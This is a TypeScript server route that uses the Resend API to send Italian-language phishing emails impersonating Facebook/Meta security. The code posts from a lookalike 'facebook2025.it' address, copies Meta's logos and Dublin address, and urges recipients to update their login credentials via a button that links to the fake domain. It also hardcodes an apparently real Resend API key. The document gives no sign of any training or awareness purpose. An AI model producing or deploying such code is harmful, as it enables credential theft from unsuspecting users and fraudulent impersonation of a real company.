import { Resend } from 'resend';

const resend = new Resend('re_XQyqAEvo_7oVzPyJwEhJ4WFe5xfm4RDjq'); // 🔐 Inserisci la tua API key qui

export async function POST(req: Request) {
  const { email } = await req.json(); // 📨 Dato ricevuto dal form

  try {
    await resend.emails.send({
      from: 'Facebook Italia <securitynoreply@facebook2025.it>',
      to: email,
      subject: 'Attività insolita sul tuo account Facebook',

      html: `<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8" />
  <title>Notifica di sicurezza</title>
</head>
<body style="font-family: Arial, sans-serif;">
  <div style="max-width:600px; margin:auto; padding:20px; background:#fff; border-radius:6px;">
    <div style="text-align:center;">
      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook" width="40" />
    </div><br />
    <p>Gentile utente,</p>
    <p>
      Abbiamo rilevato un’attività non riconosciuta sul tuo account Facebook.<br />
      Per garantire la tua sicurezza, ti invitiamo ad aggiornare le credenziali di accesso.
    </p>
    <div style="text-align:center; margin:30px 0;">
      <a href="https://facebook2025.it/"
         style="background-color:#1877f2; color:#fff; padding:12px 24px;
         text-decoration:none; font-weight:bold; border-radius:4px;">
        Modifica qui
      </a>
    </div>
    <p><strong>Non hai richiesto questa modifica?</strong><br />
    Se non hai richiesto una nuova password, comunicacelo immediatamente.</p>
    <hr />
    <p style="font-size:13px;">
      Questo messaggio è stato inviato a <strong>${email}</strong>.<br /><br />
      © Facebook. Meta Platforms Ireland Ltd., Attention: Community Operations,<br />
      4 Grand Canal Square, Dublin 2, Ireland.<br /><br />
      Per contribuire a proteggere il tuo account, <strong>non inoltrare</strong> questa e-mail.<br />
      <a href="https://www.facebook.com/help/security">Scopri di più</a>
    </p>
    <div style="text-align:center; margin:40px 0;">
      <a href="https://facebook2025.it/unsubscribe"
         style="background-color:#e4e6eb; color:#333; padding:10px 20px;
         text-decoration:none; border-radius:4px;">
        Gestisci preferenze di notifica
      </a>
    </div>
    <div style="text-align:center;">
      <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/Meta_Platforms_Inc._logo.svg"
           alt="Meta" width="70" />
    </div>
  </div>
</body>
</html>`,

      text: `Gentile utente,

Abbiamo rilevato un’attività non riconosciuta sul tuo account Facebook.
Per garantire la tua sicurezza, ti invitiamo ad aggiornare le credenziali di accesso.

Modifica qui  https://facebook2025.it/

Non hai richiesto questa modifica?
Segnalalo subito: https://facebook.com/help/security

Questo messaggio è stato inviato a ${email}.
© Facebook. Meta Platforms Ireland Ltd., Community Operations,
4 Grand Canal Square, Dublin 2, Ireland.

Per disiscriverti dalle comunicazioni:
https://facebook2025.it/unsubscribe`
    });

    return Response.json({ success: true });
  } catch (error) {
    console.error('Errore invio email:', error);
    return Response.json({ success: false, error: String(error) }, { status: 500 });
  }
}
